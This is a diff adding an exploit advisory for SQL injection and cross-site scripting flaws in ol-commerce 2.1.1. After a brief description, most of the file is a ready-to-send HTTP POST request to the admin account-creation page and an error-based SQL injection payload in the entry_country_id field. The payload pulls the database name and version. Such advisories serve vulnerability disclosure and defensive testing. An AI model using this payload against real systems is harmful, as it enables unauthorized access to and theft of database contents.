@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/68719/info
+   
+ol-commerce is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+   
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+   
+ol-commerce 2.1.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/OL-Commerce/admin/create_account.php?action=edit
+
+POST /OL-Commerce/admin/create_account.php?action=edit  HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://www.example.com/OL-Commerce/admin/create_account.php?action=edit
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 301
+
+default_address_id=&customers_gender=m&csID=100&customers_firstname=aaaa
+&customers_lastname=bbbb&customers_email_address=email@hotmail.com
+&entry_company=cccc&customers_vat_id=1212&entry_street_address=dddd
+&entry_postcode=00961&entry_city=eeee&entry_country_id=118[SQL INJECTION]
+&customers_telephone=12121233&customers_fax=23421424&status=0
+&customers_mail=yes&payment_unallowed=&shipping_unallowed=
+&entry_password=12121212&mail_comments=
+
+[NOTE]
+------
+entry_country_id=118[SQL INJECTION]=118' and (select 1 from (select
+count(*),concat((select(select
+concat(cast(concat(database(),0x3a,version()) as char),0x7e)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from
+information_schema.tables group by x)a) and 1=1-- -
